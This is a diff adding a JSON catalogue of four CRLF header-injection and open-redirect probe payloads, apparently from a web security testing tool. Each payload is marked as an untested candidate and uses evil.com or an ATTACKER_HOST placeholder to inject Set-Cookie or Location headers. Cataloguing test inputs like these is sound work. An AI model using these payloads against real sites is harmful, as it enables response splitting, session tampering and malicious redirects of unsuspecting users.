@@ -1,0 +1,114 @@
+{
+  "name": "header_injection_probes",
+  "record_type": "header_injection_probe",
+  "count": 4,
+  "note": "Classification only; records remain untested unless explicitly documented otherwise.",
+  "records": [
+    {
+      "id": "OR-0314",
+      "payload": "/redir?url=//evil.com%0D%0ASet-Cookie:%20test=1",
+      "families": [
+        "protocol_relative_or_slash_variation",
+        "percent_or_escape_encoding",
+        "control_whitespace_or_header_edge",
+        "query_or_full_request_context"
+      ],
+      "sources": [
+        "previous_440_wordlist"
+      ],
+      "templated_payload": "/redir?url=//{{ATTACKER_HOST}}%0D%0ASet-Cookie:%20test=1",
+      "classification_note": "Candidate test input only; not a confirmed bypass.",
+      "record_type": "header_injection_probe",
+      "review_status": "classified_unverified",
+      "status": "untested",
+      "confidence": "candidate",
+      "triage_note": "Header injection / response-splitting probe; report separately from Open Redirect.",
+      "runtime_value": "/redir?url=//{{ATTACKER_HOST}}%0D%0ASet-Cookie:%20test=1",
+      "transport_profile": "query-component-serialize-once",
+      "required_placeholders": [
+        "ATTACKER_HOST"
+      ],
+      "unknown_placeholders": []
+    },
+    {
+      "id": "OR-0315",
+      "payload": "/redir?url=//evil.com%0ASet-Cookie:%20test=1",
+      "families": [
+        "protocol_relative_or_slash_variation",
+        "percent_or_escape_encoding",
+        "control_whitespace_or_header_edge",
+        "query_or_full_request_context"
+      ],
+      "sources": [
+        "previous_440_wordlist"
+      ],
+      "templated_payload": "/redir?url=//{{ATTACKER_HOST}}%0ASet-Cookie:%20test=1",
+      "classification_note": "Candidate test input only; not a confirmed bypass.",
+      "record_type": "header_injection_probe",
+      "review_status": "classified_unverified",
+      "status": "untested",
+      "confidence": "candidate",
+      "triage_note": "Header injection / response-splitting probe; report separately from Open Redirect.",
+      "runtime_value": "/redir?url=//{{ATTACKER_HOST}}%0ASet-Cookie:%20test=1",
+      "transport_profile": "query-component-serialize-once",
+      "required_placeholders": [
+        "ATTACKER_HOST"
+      ],
+      "unknown_placeholders": []
+    },
+    {
+      "id": "OR-0316",
+      "payload": "/redir?url=//evil.com%0D%0ALocation:%20evil.com",
+      "families": [
+        "protocol_relative_or_slash_variation",
+        "percent_or_escape_encoding",
+        "control_whitespace_or_header_edge",
+        "crlf_header_injection_probe",
+        "query_or_full_request_context"
+      ],
+      "sources": [
+        "previous_440_wordlist"
+      ],
+      "templated_payload": "/redir?url=//{{ATTACKER_HOST}}%0D%0ALocation:%20{{ATTACKER_HOST}}",
+      "classification_note": "Candidate test input only; not a confirmed bypass.",
+      "record_type": "header_injection_probe",
+      "review_status": "classified_unverified",
+      "status": "untested",
+      "confidence": "candidate",
+      "triage_note": "Header injection / response-splitting probe; report separately from Open Redirect.",
+      "runtime_value": "/redir?url=//{{ATTACKER_HOST}}%0D%0ALocation:%20{{ATTACKER_HOST}}",
+      "transport_profile": "query-component-serialize-once",
+      "required_placeholders": [
+        "ATTACKER_HOST"
+      ],
+      "unknown_placeholders": []
+    },
+    {
+      "id": "OR-0483",
+      "payload": "&%0d%0a1Location:https://google.com",
+      "families": [
+        "protocol_relative_or_slash_variation",
+        "percent_or_escape_encoding",
+        "control_whitespace_or_header_edge",
+        "http_https_scheme_or_absolute_url",
+        "crlf_header_injection_probe"
+      ],
+      "sources": [
+        "user_supplied_513_list"
+      ],
+      "templated_payload": "&%0d%0a1Location:https://{{ATTACKER_HOST}}",
+      "classification_note": "Candidate test input only; not a confirmed bypass.",
+      "record_type": "header_injection_probe",
+      "review_status": "classified_unverified",
+      "status": "untested",
+      "confidence": "candidate",
+      "triage_note": "Header injection / response-splitting probe; report separately from Open Redirect.",
+      "runtime_value": "&%0d%0a1Location:https://{{ATTACKER_HOST}}",
+      "transport_profile": "query-component-serialize-once",
+      "required_placeholders": [
+        "ATTACKER_HOST"
+      ],
+      "unknown_placeholders": []
+    }
+  ]
+}
